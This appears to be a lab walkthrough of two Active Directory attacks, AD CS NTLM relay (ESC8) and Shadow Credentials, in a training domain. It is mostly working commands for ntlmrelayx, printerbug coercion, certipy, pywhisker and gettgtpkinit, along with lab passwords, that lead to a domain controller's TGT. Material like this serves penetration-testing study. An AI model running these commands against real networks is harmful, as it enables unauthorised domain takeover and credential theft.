
`Pass-the-Certificate` refers to the technique of using X.509 certificates to successfully obtain `Ticket Granting Tickets (TGTs)`.

---

## AD CS NTLM Relay Attack (ESC8)

NTLM relay attack targeting an ADCS HTTP endpoint.
A certificate authority configured to allow web enrolment typically hosts the following application at `http://CA-IP/certsrv/default.asp

### NTLM Relay Listener

We can use Impacket’s [ntlmrelayx](https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py) to listen for inbound connections and relay them to the web enrolment service using the following command:
```shell
impacket-ntlmrelayx -t http://10.129.234.110/certsrv/certfnsh.asp --adcs -smb2support --template KerberosAuthentication
```

**Note:** The value passed to `--template` may be different in other environments. This is simply the certificate template which is used by Domain Controllers for authentication.
This can be enumerated with tools like [certipy](https://github.com/ly4k/Certipy).

```shell
certipy find -u white -p 'snow1__3' -dc-ip 10.129.225.219
```

Attackers can either wait for victims to attempt authentication against their machine randomly, or they can actively coerce them into doing so.
The command below forces `10.129.234.109 (DC01)` to attempt authentication against `10.10.16.12 (attacker host)`:

### Force Authentication

```shell
python3 printerbug.py INLANEFREIGHT.LOCAL/white:"snow1__3"@10.129.234.109 10.10.16.12
```

Referring back to `ntlmrelayx`, we can see from the output that the authentication request was successfully relayed to the web enrolment application, and a certificate was issued for `DC01$`.

We can now perform a `Pass-the-Certificate` attack to obtain a TGT as `DC01$`.
### Get TGT from Certificate

```shell
python3 gettgtpkinit.py -cert-pfx ../krbrelayx/DC01\$.pfx -dc-ip 10.129.234.109 'inlanefreight.local/dc01$' /tmp/dc.ccache
```

---

## Shadow Credentials (msDS-KeyCredentialLink)

[Shadow Credentials](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab) refers to an Active Directory attack that abuses the [msDS-KeyCredentialLink](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/f70afbcc-780e-4d91-850c-cfadce5bb15c) attribute of a victim user. This attribute stores public keys that can be used for authentication via `PKINIT`.

We can use `pywhisker` to generate a X.509 Certificate and write the public key to the vicim user's (Here jpinkman)`msDS-KeyCredentialLink` attribute:

```shell
pywhisker --dc-ip 10.129.234.109 -d INLANEFREIGHT.LOCAL -u wwhite -p 'package5shores_topher1' --target jpinkman --action add
```

A .pfx file has been created with a password:

```shell
python3 gettgtpkinit.py -cert-pfx ../eFUVVTPf.pfx -pfx-pass 'bmRH4LK7UwPrAOfvIx6W' -dc-ip 10.129.234.109 INLANEFREIGHT.LOCAL/jpinkman /tmp/jpinkman.ccache
```

---